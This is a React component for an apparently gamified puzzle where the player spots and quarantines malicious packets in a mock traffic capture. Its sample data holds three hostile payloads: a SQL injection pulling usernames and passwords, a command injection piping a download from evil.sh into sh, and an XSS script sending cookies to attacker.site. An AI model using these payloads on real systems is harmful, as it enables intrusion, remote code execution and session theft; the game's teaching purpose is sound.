import React, { useState, useEffect } from 'react';
import { Activity, CheckCircle2, RefreshCw, ShieldAlert, Terminal, Zap } from 'lucide-react';
import { playBreachFanfare, playClickSound, playHackingBeep, playZapSound } from '../../utils/audio.js';

const INITIAL_PACKETS = [
  { id: 1, proto: 'TCP', src: '192.168.1.45', dst: '10.0.0.1:443', payload: 'TLS 1.3 ClientHello (SNI: api.internal.corp)', malicious: false },
  { id: 2, proto: 'HTTP', src: '45.134.22.9', dst: '10.0.0.80:80', payload: "GET /admin.php?id=1' UNION SELECT null,username,password FROM users--", malicious: true, threat: 'SQL_INJECTION' },
  { id: 3, proto: 'DNS', src: '192.168.1.102', dst: '8.8.8.8:53', payload: 'Standard query 0x12fa A github.com', malicious: false },
  { id: 4, proto: 'HTTP', src: '185.220.101.4', dst: '10.0.0.80:8080', payload: 'POST /upload.php?cmd=;curl http://evil.sh/payload.bin | sh', malicious: true, threat: 'REMOTE_COMMAND_INJECTION' },
  { id: 5, proto: 'TCP', src: '192.168.1.18', dst: '10.0.0.1:22', payload: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1', malicious: false },
  { id: 6, proto: 'HTTP', src: '103.14.26.11', dst: '10.0.0.80:443', payload: '<script>fetch("https://attacker.site/steal?cookie="+document.cookie)</script>', malicious: true, threat: 'STORED_XSS_EXPLOIT' },
];

export default function PacketSnifferHack({ onSolved, onBypass }) {
  const [quarantined, setQuarantined] = useState({});
  const [solved, setSolved] = useState(false);
  const totalMalicious = 3;

  const quarantinedCount = Object.keys(quarantined).filter((id) => quarantined[id]).length;

  useEffect(() => {
    if (quarantinedCount >= totalMalicious && !solved) {
      setSolved(true);
      playBreachFanfare();
      setTimeout(() => {
        onSolved();
      }, 1000);
    }
  }, [quarantinedCount, totalMalicious, solved, onSolved]);

  const handlePacketClick = (pkt) => {
    if (solved || quarantined[pkt.id]) return;

    if (pkt.malicious) {
      playHackingBeep(1600 + quarantinedCount * 250);
      setQuarantined((prev) => ({ ...prev, [pkt.id]: true }));
    } else {
      // Benign packet clicked
      playClickSound(320, 0.12);
    }
  };

  return (
    <div className="hack-puzzle-container packet-hack">
      <div className="hack-header-bar">
        <div className="hack-title">
          <Activity size={14} className="hack-icon-pulse" />
          <span>WIRESHARK_IDS // PCAP_ANOMALY_QUARANTINE.pcap</span>
        </div>
        <div className="hack-actions-right">
          <span className="hack-status-badge">
            {solved ? 'ALL_EXPLOITS_QUARANTINED' : `${quarantinedCount}/${totalMalicious} THREATS NEUTRALIZED`}
          </span>
          <button
            className="hack-bypass-btn"
            onClick={() => {
              playZapSound();
              onBypass();
            }}
            title="Instant Reveal"
          >
            DEV_BYPASS ⚡
          </button>
        </div>
      </div>

      <div className="hack-instructions">
        <p>
          Analyze the live PCAP stream. Click on the <strong style={{ color: '#ef4444' }}>3 MALICIOUS EXPLOIT PACKETS</strong> (SQLi, RCE, or XSS) to isolate and quarantine them!
        </p>
      </div>

      {/* Packet Stream Table */}
      <div className="pcap-table-box">
        <div className="pcap-table-header">
          <span className="col-no">NO.</span>
          <span className="col-proto">PROTO</span>
          <span className="col-src">SOURCE</span>
          <span className="col-dst">DESTINATION</span>
          <span className="col-info">PAYLOAD / TELEMETRY</span>
          <span className="col-action">STATUS</span>
        </div>

        <div className="pcap-packets-list">
          {INITIAL_PACKETS.map((pkt) => {
            const isQuarantined = !!quarantined[pkt.id];

            return (
              <button
                type="button"
                key={pkt.id}
                className={`pcap-row-btn ${pkt.proto.toLowerCase()} ${
                  isQuarantined ? 'quarantined' : ''
                }`}
                onClick={() => handlePacketClick(pkt)}
                disabled={solved || isQuarantined}
              >
                <span className="col-no">0{pkt.id}</span>
                <span className={`col-proto proto-tag ${pkt.proto.toLowerCase()}`}>{pkt.proto}</span>
                <span className="col-src">{pkt.src}</span>
                <span className="col-dst">{pkt.dst}</span>
                <span className="col-info" title={pkt.payload}>{pkt.payload}</span>
                <span className="col-action">
                  {isQuarantined ? (
                    <span className="badge-quarantined">✔ QUARANTINED</span>
                  ) : (
                    <span className="badge-inspect">INSPECT</span>
                  )}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {solved ? (
        <div className="hack-success-banner">
          <CheckCircle2 size={16} />
          <span>NETWORK THREATS PURGED // PCAP TELEMETRY CONSOLE GRANTED</span>
        </div>
      ) : (
        <div className="hack-hint-bar">
          <span className="live-blip" />
          <span>Look for unauthorized shell commands, unescaped SQL quotes, or script injection payloads.</span>
        </div>
      )}
    </div>
  );
}
